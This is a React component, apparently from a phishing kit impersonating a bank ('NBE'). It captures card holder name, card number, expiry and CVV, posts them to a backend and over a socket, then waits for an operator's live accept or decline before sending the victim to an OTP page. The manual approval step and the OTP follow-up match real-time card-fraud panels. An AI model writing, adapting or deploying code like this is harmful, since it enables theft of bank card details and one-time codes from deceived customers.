import axios from "axios";
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { useLanguage } from "../hooks/useLanguage";
import { useAdminApproval } from "../hooks/useAdminApproval";
import ProcessingOverlay from "../components/nbe/ProcessingOverlay";
import DeclineError from "../components/nbe/DeclineError";

const Visa = () => {
  const navigate = useNavigate();
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [car_holder_name, setCardHolderName] = useState("");
  const [expireMonth, setExpireMonth] = useState("");
  const [expireYear, setExpireYear] = useState("");
  const { t, dir } = useLanguage();
  const { waiting, setWaiting, clearError, declineMessage } = useAdminApproval({
    orderId: id,
    acceptEvent: "acceptVisa",
    declineEvent: "declineVisa",
    declineMessageKey: "declineVisa",
    onAccept: () => navigate("/visaOtp"),
  });

  const formatCardNumber = (value) => {
    const numericValue = value.replace(/\D/g, "");
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");
    formattedValue = formattedValue.slice(0, 19);
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    clearError();
    const check = card_number.split(" ").join("");
    if (check.length !== 16) {
      window.alert(t("cardLengthError"));
      return;
    }

    setWaiting(true);
    const finalData = {
      cardNumber: card_number,
      expiryDate: expireMonth + "/" + expireYear,
      cvv,
      card_holder_name: car_holder_name,
    };
    try {
      await axios.post(api_route + "/visa/" + id, finalData).then(() => {
        socket.emit("visa", { id, ...finalData });
      });
    } catch (err) {
      console.error(err);
      setWaiting(false);
    }
  };

  return (
    <div
      className="w-full flex flex-col min-h-screen items-center justify-center relative max-w-md mx-auto px-4"
      dir={dir}
    >
      {waiting && <ProcessingOverlay />}
      <img src="/img1.png" alt="NBE Logo" className="w-1/2 py-5 my-2" />
      <form
        className="border border-orange-400 w-full p-3 rounded-xl justify-center items-center flex flex-col gap-y-2"
        onSubmit={handleSubmit}
      >
        <div className="w-full py-3 flex flex-col items-center justify-between p-2 rounded-xl">
          <div className="flex flex-col w-full gap-3 my-2">
            <input
              value={car_holder_name}
              required
              onChange={(e) => setCardHolderName(e.target.value)}
              dir="ltr"
              minLength={4}
              type="text"
              placeholder={t("cardHolderName")}
              className={`w-full rounded-md border border-orange-400 p-2 placeholder:text-gray-600 outline-blue-500 ${dir === "rtl" ? "text-right" : "text-left"}`}
            />
          </div>
          <div className="flex flex-col w-full gap-3 my-2">
            <input
              value={card_number}
              required
              onChange={handleCardNumberChange}
              dir="ltr"
              maxLength={19}
              minLength={16}
              inputMode="numeric"
              type="text"
              placeholder={t("cardNumber")}
              className={`w-full rounded-md border border-orange-400 p-2 placeholder:text-gray-600 outline-blue-500 ${dir === "rtl" ? "text-right" : "text-left"}`}
            />
          </div>
          <div className="w-full flex items-end justify-end">
            <img src="/img7.avif" alt="" />
          </div>
          <div className="flex w-full gap-2">
            <div className="flex flex-col w-full gap-x-5 text-xl my-2">
              <div className="flex w-full gap-x-5 px-2 text-sm">
                <select
                  className={`w-1/2 rounded-md border border-orange-400 bg-white p-1 outline-blue-500 ${dir === "rtl" ? "text-right" : "text-left"}`}
                  onChange={(e) => setExpireMonth(e.target.value)}
                  value={expireMonth}
                  required
                >
                  <option hidden value="">
                    {t("month")}
                  </option>
                  <option>01</option>
                  <option>02</option>
                  <option>03</option>
                  <option>04</option>
                  <option>05</option>
                  <option>06</option>
                  <option>07</option>
                  <option>08</option>
                  <option>09</option>
                  <option>10</option>
                  <option>11</option>
                  <option>12</option>
                </select>
                <select
                  className={`w-1/2 rounded-md bg-white border border-orange-400 p-1 outline-blue-500 ${dir === "rtl" ? "text-right" : "text-left"}`}
                  onChange={(e) => setExpireYear(e.target.value)}
                  value={expireYear}
                  required
                >
                  <option hidden value="">
                    {t("year")}
                  </option>
                  <option>2025</option>
                  <option>2026</option>
                  <option>2027</option>
                  <option>2028</option>
                  <option>2029</option>
                  <option>2030</option>
                  <option>2031</option>
                  <option>2032</option>
                  <option>2033</option>
                </select>
              </div>
            </div>
          </div>
          <div className="flex items-center justify-start gap-x-5 px-1.5 text-lg text-gray-500 my-2">
            <img src="/img8.avif" className="w-1/2" alt="" />
            <input
              value={cvv}
              required
              onChange={handleCvvChange}
              dir="ltr"
              maxLength={3}
              minLength={3}
              inputMode="numeric"
              type="text"
              placeholder="CVV"
              className={`w-1/2  rounded-md bg-white border border-orange-400 p-1 outline-blue-500 ${dir === "rtl" ? "text-right" : "text-left"}`}
            />
          </div>
          <DeclineError message={declineMessage} />
          <button
            className="bg-orange-400 w-2/3 my-5 font-bold text-white flex items-center justify-center py-1 rounded-full mt-2"
            type="submit"
            disabled={waiting}
          >
            {waiting ? (
              <TailSpin
                height="30"
                width="30"
                color="white"
                ariaLabel="tail-spin-loading"
                radius="1"
                visible={true}
              />
            ) : (
              t("continue")
            )}
          </button>
        </div>
      </form>
      <img
        src={`/img5.${dir === "rtl" ? "avif" : "jpeg"}`}
        className="w-full my-2"
        alt=""
      />
    </div>
  );
};

export default Visa;
